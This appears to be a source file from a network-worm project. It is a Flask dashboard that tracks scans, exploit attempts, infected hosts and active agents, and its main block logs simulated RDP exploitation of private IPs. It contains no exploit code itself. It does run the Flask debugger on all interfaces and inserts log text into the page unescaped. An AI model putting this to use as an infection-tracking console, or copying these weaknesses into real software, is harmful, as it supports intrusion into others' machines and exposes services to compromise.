"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Real-Time Monitoring Dashboard
Live view of worm activity and infected devices
"""


import os
import sys
import threading
import time
from collections import deque
from datetime import datetime

from flask import Flask, jsonify, render_template_string

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class MonitoringDashboard:
    """
    Real-time monitoring dashboard for worm activity
    Shows live activity feed and device status
    """

    def __init__(self, port=8080):
        self.app = Flask(__name__)
        self.port = port

        # Activity log (last 100 events)
        self.activity_log = deque(maxlen=100)

        # Device tracking
        self.devices = {}  # ip -> device_info

        # Statistics
        self.stats = {
            "start_time": datetime.now(),
            "total_scans": 0,
            "total_exploits": 0,
            "successful_infections": 0,
            "failed_attempts": 0,
            "active_agents": 0,
        }

        self._setup_routes()
        logger.info(f"Monitoring dashboard initialized on port {port}")

    def _setup_routes(self):
        """Setup Flask routes"""

        @self.app.route("/")
        def dashboard():
            return self.get_dashboard_html()

        @self.app.route("/api/activity")
        def get_activity():
            """Get recent activity"""
            return jsonify(list(self.activity_log))

        @self.app.route("/api/devices")
        def get_devices():
            """Get all devices"""
            return jsonify(list(self.devices.values()))

        @self.app.route("/api/stats")
        def get_stats():
            """Get statistics"""
            uptime = (datetime.now() - self.stats["start_time"]).total_seconds()
            return jsonify(
                {
                    **self.stats,
                    "uptime_seconds": uptime,
                    "uptime_formatted": self._format_uptime(uptime),
                }
            )

    def log_activity(self, activity_type: str, message: str, device_ip: str = None):
        """Log activity event"""
        event = {
            "timestamp": datetime.now().isoformat(),
            "type": activity_type,
            "message": message,
            "device_ip": device_ip,
        }
        self.activity_log.append(event)

        # Update stats
        if activity_type == "scan":
            self.stats["total_scans"] += 1
        elif activity_type == "exploit":
            self.stats["total_exploits"] += 1
        elif activity_type == "infection":
            self.stats["successful_infections"] += 1
        elif activity_type == "failure":
            self.stats["failed_attempts"] += 1

    def update_device(self, ip: str, status: str, info: dict = None):
        """Update device information"""
        if ip not in self.devices:
            self.devices[ip] = {
                "ip": ip,
                "status": status,
                "first_seen": datetime.now().isoformat(),
                "last_updated": datetime.now().isoformat(),
                "info": info or {},
            }
        else:
            self.devices[ip]["status"] = status
            self.devices[ip]["last_updated"] = datetime.now().isoformat()
            if info:
                self.devices[ip]["info"].update(info)

    def _format_uptime(self, seconds: float) -> str:
        """Format uptime in human-readable format"""
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"

    def get_dashboard_html(self) -> str:
        """Generate HTML dashboard"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Worm Monitoring Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: #fff;
            padding: 20px;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .panel {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .panel h2 {
            margin-bottom: 20px;
            font-size: 1.5em;
            border-bottom: 2px solid rgba(255,255,255,0.3);
            padding-bottom: 10px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: rgba(255,255,255,0.15);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }
        
        .stat-card h3 {
            font-size: 0.9em;
            opacity: 0.8;
            margin-bottom: 10px;
        }
        
        .stat-card .value {
            font-size: 2.5em;
            font-weight: bold;
            color: #4ade80;
        }
        
        .activity-feed {
            max-height: 400px;
            overflow-y: auto;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
            padding: 15px;
        }
        
        .activity-item {
            padding: 10px;
            margin-bottom: 10px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
            border-left: 4px solid #4ade80;
            animation: slideIn 0.3s ease-out;
        }
        
        .activity-item.scan { border-left-color: #60a5fa; }
        .activity-item.exploit { border-left-color: #fbbf24; }
        .activity-item.infection { border-left-color: #4ade80; }
        .activity-item.failure { border-left-color: #f87171; }
        
        .activity-time {
            font-size: 0.8em;
            opacity: 0.7;
        }
        
        .devices-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .devices-table th,
        .devices-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .devices-table th {
            font-weight: 600;
            opacity: 0.9;
            background: rgba(255,255,255,0.05);
        }
        
        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 0.85em;
            font-weight: 600;
        }
        
        .status-discovered { background: #60a5fa; }
        .status-scanning { background: #fbbf24; }
        .status-exploiting { background: #f97316; }
        .status-infected { background: #4ade80; }
        .status-failed { background: #f87171; }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .refresh-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(74, 222, 128, 0.2);
            padding: 10px 20px;
            border-radius: 20px;
            border: 2px solid #4ade80;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: rgba(255,255,255,0.3);
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="refresh-indicator">🔄 Live</div>
    
    <div class="container">
        <h1>🎯 Worm Monitoring Dashboard</h1>
        
        <!-- Statistics -->
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Scans</h3>
                <div class="value" id="total-scans">0</div>
            </div>
            <div class="stat-card">
                <h3>Exploits Attempted</h3>
                <div class="value" id="total-exploits">0</div>
            </div>
            <div class="stat-card">
                <h3>Successful Infections</h3>
                <div class="value" id="successful-infections">0</div>
            </div>
            <div class="stat-card">
                <h3>Active Agents</h3>
                <div class="value" id="active-agents">0</div>
            </div>
            <div class="stat-card">
                <h3>Uptime</h3>
                <div class="value" id="uptime" style="font-size: 1.8em;">00:00:00</div>
            </div>
        </div>
        
        <!-- Main Grid -->
        <div class="grid">
            <!-- Activity Feed -->
            <div class="panel">
                <h2>📋 Activity Feed</h2>
                <div class="activity-feed" id="activity-feed">
                    <div class="activity-item">
                        <div class="activity-time">Waiting for activity...</div>
                        <div>Dashboard initialized</div>
                    </div>
                </div>
            </div>
            
            <!-- Devices -->
            <div class="panel">
                <h2>💻 Devices</h2>
                <div style="max-height: 400px; overflow-y: auto;">
                    <table class="devices-table">
                        <thead>
                            <tr>
                                <th>IP Address</th>
                                <th>Status</th>
                                <th>Last Updated</th>
                            </tr>
                        </thead>
                        <tbody id="devices-tbody">
                            <tr>
                                <td colspan="3" style="text-align: center; opacity: 0.5;">
                                    No devices discovered yet
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        function updateDashboard() {
            // Update stats
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('total-scans').textContent = data.total_scans;
                    document.getElementById('total-exploits').textContent = data.total_exploits;
                    document.getElementById('successful-infections').textContent = data.successful_infections;
                    document.getElementById('active-agents').textContent = data.active_agents;
                    document.getElementById('uptime').textContent = data.uptime_formatted;
                });
            
            // Update activity feed
            fetch('/api/activity')
                .then(r => r.json())
                .then(activities => {
                    const feed = document.getElementById('activity-feed');
                    feed.innerHTML = activities.reverse().map(a => {
                        const time = new Date(a.timestamp).toLocaleTimeString();
                        return `
                            <div class="activity-item ${a.type}">
                                <div class="activity-time">${time}</div>
                                <div>${a.message}</div>
                                ${a.device_ip ? `<div style="font-size: 0.9em; opacity: 0.8;">Device: ${a.device_ip}</div>` : ''}
                            </div>
                        `;
                    }).join('');
                });
            
            // Update devices
            fetch('/api/devices')
                .then(r => r.json())
                .then(devices => {
                    const tbody = document.getElementById('devices-tbody');
                    if (devices.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="3" style="text-align: center; opacity: 0.5;">No devices discovered yet</td></tr>';
                    } else {
                        tbody.innerHTML = devices.map(d => {
                            const time = new Date(d.last_updated).toLocaleTimeString();
                            return `
                                <tr>
                                    <td>${d.ip}</td>
                                    <td><span class="status-badge status-${d.status}">${d.status}</span></td>
                                    <td>${time}</td>
                                </tr>
                            `;
                        }).join('');
                    }
                });
        }
        
        // Update every 2 seconds
        setInterval(updateDashboard, 2000);
        updateDashboard();
    </script>
</body>
</html>
        """

    def run(self, debug=False):
        """Start monitoring dashboard"""
        logger.info(f"Starting monitoring dashboard on port {self.port}")
        self.app.run(host="0.0.0.0", port=self.port, debug=debug, threaded=True)

    def run_background(self):
        """Run dashboard in background thread"""
        thread = threading.Thread(target=self.run, daemon=True)
        thread.start()
        logger.info(f"Monitoring dashboard running: http://localhost:{self.port}")
        return thread


# Global dashboard instance
_dashboard = None


def get_dashboard(port=8080):
    """Get or create global dashboard instance"""
    global _dashboard
    if _dashboard is None:
        _dashboard = MonitoringDashboard(port=port)
    return _dashboard


if __name__ == "__main__":
    dashboard = MonitoringDashboard(port=8080)

    print("=" * 60)
    print("MONITORING DASHBOARD")
    print("=" * 60)
    print(f"Dashboard: http://localhost:8080")
    print("=" * 60)

    # Simulate some activity
    import random

    def simulate_activity():
        time.sleep(2)

        ips = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]

        for i in range(10):
            ip = random.choice(ips)

            # Scan
            dashboard.log_activity("scan", f"Scanning {ip}", ip)
            dashboard.update_device(ip, "scanning")
            time.sleep(1)

            # Exploit
            dashboard.log_activity("exploit", f"Attempting RDP exploit on {ip}", ip)
            dashboard.update_device(ip, "exploiting")
            time.sleep(1)

            # Result
            if random.random() > 0.5:
                dashboard.log_activity("infection", f"Successfully infected {ip}", ip)
                dashboard.update_device(ip, "infected")
                dashboard.stats["active_agents"] += 1
            else:
                dashboard.log_activity("failure", f"Exploit failed on {ip}", ip)
                dashboard.update_device(ip, "failed")

            time.sleep(2)

    # Start simulation in background
    threading.Thread(target=simulate_activity, daemon=True).start()

    dashboard.run(debug=True)
